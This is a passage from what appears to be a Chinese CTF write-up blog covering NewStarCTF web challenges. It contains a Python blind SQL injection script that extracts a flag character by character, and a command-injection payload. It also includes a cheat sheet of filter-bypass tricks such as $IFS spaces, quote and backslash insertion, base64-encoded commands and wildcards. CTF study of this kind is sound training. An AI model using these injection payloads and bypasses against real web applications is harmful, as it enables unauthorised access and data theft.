class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">1000</span>):</span><br><span class="line">        low = <span class="number">32</span></span><br><span class="line">        high = <span class="number">128</span></span><br><span class="line">        mid = (low+high)//<span class="number">2</span></span><br><span class="line">        <span class="keyword">while</span> low &lt; high:</span><br><span class="line">            <span class="comment">#--报数据</span></span><br><span class="line">            payload = <span class="string">&quot;&#x27; %26%26 if(Ascii(Substr((Select Group_concat(flag) From here_is_flag),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)-- -&quot;</span>.<span class="built_in">format</span>(i=i, mid=mid)</span><br><span class="line">            res = requests.get(host + payload)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;Physics&#x27;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">                low = mid + <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                high = mid</span><br><span class="line">            mid = (low + high) // <span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> mid == <span class="number">32</span> <span class="keyword">or</span> mid == <span class="number">127</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        flag += <span class="built_in">chr</span>(mid)</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;数据为：&quot;</span>+flag)</span><br><span class="line"></span><br><span class="line">DBname()</span><br><span class="line">TBname()</span><br><span class="line">CLname()</span><br><span class="line">Valname()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>可得到flag</p><p><img src="/2024/07/14/CTF%E5%88%B7%E9%A2%98%E7%AF%871/flag.png"></p><p>参考</p><ul><li><a href="https://blog.csdn.net/m0_73512445/article/details/133694293">[NewStarCTF 2023] web题解</a></li></ul><h3 id="NewStarCTF-公开赛赛道-So-Baby-RCE"><a href="#NewStarCTF-公开赛赛道-So-Baby-RCE" class="headerlink" title="[NewStarCTF 公开赛赛道]So Baby RCE"></a>[NewStarCTF 公开赛赛道]So Baby RCE</h3><p>题目如下：</p><p><img src="/2024/07/14/CTF%E5%88%B7%E9%A2%98%E7%AF%871/rce_1.png"></p><p>发现代码中没有过滤<code>ls</code></p><p><img src="/2024/07/14/CTF%E5%88%B7%E9%A2%98%E7%AF%871/rce_2.png"></p><p>当前目录下什么东西，尝试跨目录读取文件，<code>cd </code>未过滤，<code>&amp;</code>未过滤，<code>cat</code>被过滤，通过添加特殊字符绕过<code>ca$@t</code>。记住$@特殊字符的使用，很多情况下可以绕过。</p><p><img src="/2024/07/14/CTF%E5%88%B7%E9%A2%98%E7%AF%871/rce_3.png"></p><p>Payload如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd%09..%26%26cd%09..%26%26cd%09..%26%26ls%26%26ca$@t%09ffff$@llllaaaaggggg</span><br></pre></td></tr></table></figure><h4 id="空格代替"><a href="#空格代替" class="headerlink" title="空格代替"></a>空格代替</h4><p>命令执行中空格被过滤。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">&#123;IFS&#125;</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">IFS<span class="variable">$9</span></span></span><br><span class="line"><span class="meta prompt_">%</span><span class="language-bash">09</span></span><br></pre></td></tr></table></figure><p><img src="/2024/07/14/CTF%E5%88%B7%E9%A2%98%E7%AF%871/rce1_1_1.png"></p><blockquote><p><code>$IFS</code>在linux下表示分隔符，只有<code>cat$IFSa.txt</code>的时候，bash解析器会把整个IFSa当作变量名，所以导致没有办法运行，然而如果加上{}就固定了变量名，同理在后面加个$可以起到截断的作用。</p><p><code>$9</code>指的是当前系统shell进程的第九个参数的持有者，若没有9个参数，则为空，因此$9相当于没有加东西，等于做了一个前后隔离。</p></blockquote><p>不仅仅局限于<code>$9</code>，$加一个一位数字均可。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line"></span><br><span class="line">echo &quot;参数1：&quot; $1</span><br><span class="line">echo &quot;参数2：&quot; $2</span><br><span class="line">echo &quot;参数3：&quot; $3</span><br><span class="line">echo &quot;参数4：&quot; $4</span><br><span class="line">echo &quot;参数5：&quot; $5</span><br><span class="line">echo &quot;参数6：&quot; $6</span><br><span class="line">echo &quot;参数7：&quot; $7</span><br><span class="line">echo &quot;参数8：&quot; $8</span><br><span class="line">echo &quot;参数9：&quot; $9</span><br><span class="line">echo &quot;参数10：&quot; $10</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">测试  ./test.sh a b c d c d e f g h</span> </span><br></pre></td></tr></table></figure><p>结果：</p><p><img src="/2024/07/14/CTF%E5%88%B7%E9%A2%98%E7%AF%871/rce1_1_2.png"></p><blockquote><p><code>$8、$9</code>因为没有传递参数，返回的结果为空。</p><p><code>$10</code>被解析成了<code>$1</code>和0，所以结果会是<code>a0</code>，若想获取第10个变量使用<code>$&#123;10&#125;</code>。</p></blockquote><h4 id="读取内容"><a href="#读取内容" class="headerlink" title="读取内容"></a>读取内容</h4><p>列出目录</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tee #ls -l| tee 1.txt</span><br></pre></td></tr></table></figure><blockquote><p>tee命令通常的用法是将一个命令的输出保存到文件中，同时在终端上显示输出内容。</p></blockquote><p>读取文件</p><p><code>cat</code>被禁用，使用下列命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">cat   # 由第一行开始显示内容，并将所有内容输出</span><br><span class="line">tac   # 从最后一行倒序显示内容，并将所有内容输出</span><br><span class="line">more  # 根据窗口大小，一页一页的现实文件内容</span><br><span class="line">less  # 和more类似，但其优点可以往前翻页，而且进行可以搜索字符</span><br><span class="line">head  # 只显示头几行</span><br><span class="line">tail  # 只显示最后几行</span><br><span class="line">nl    # 类似于cat -n，显示时输出行号</span><br><span class="line">tailf # 类似于tail -f</span><br><span class="line">sort # 读文件</span><br></pre></td></tr></table></figure><h4 id="加特殊字符绕过"><a href="#加特殊字符绕过" class="headerlink" title="加特殊字符绕过"></a>加特殊字符绕过</h4><p><code>cat</code>被禁用。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ca\t fl\ag.txt</span><br><span class="line"><span class="meta prompt_">ca$</span><span class="language-bash">@t fl<span class="variable">$@ag</span>.txt</span></span><br><span class="line">c&#x27;a&#x27;t flag.txt</span><br><span class="line">c&quot;a&quot;t flag.txt</span><br></pre></td></tr></table></figure><h4 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`echo &#x27;Y2F0Cg==&#x27; | base64 -d`  flag.txt #cat </span><br></pre></td></tr></table></figure><h4 id="拼接绕过"><a href="#拼接绕过" class="headerlink" title="拼接绕过"></a>拼接绕过</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a=c;b=at;c=f;d=lag;e=.txt;$a$b $c$d$e</span><br></pre></td></tr></table></figure><h4 id="通配符绕过"><a href="#通配符绕过" class="headerlink" title="通配符绕过"></a>通配符绕过</h4><blockquote><p>[…]表示匹配方括号之中的任意一个字符</p><p>{…}表示匹配大括号里面的所有模式</p><p>上述二则的区别，当匹配的文件不存在时，[…]会失去模式的功能，变成一个单纯的字符串，而{…}依然可以展开。</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cat f?ag.txt</span><br><span class="line">cat fl*</span><br><span class="line">cat f[a-z]ag.txt</span><br><span class="line">cat fl&#123;a,b,c,d,e&#125;g.txt</span><br></pre></td></tr></table></figure><p><img src="/2024/07/14/CTF%E5%88%B7%E9%A2%98%E7%AF%871/rce1_1_3.png"></p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> RCE </tag>
            
            <tag> SQL注入 </tag>
            
            <tag> 二分法 </tag>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
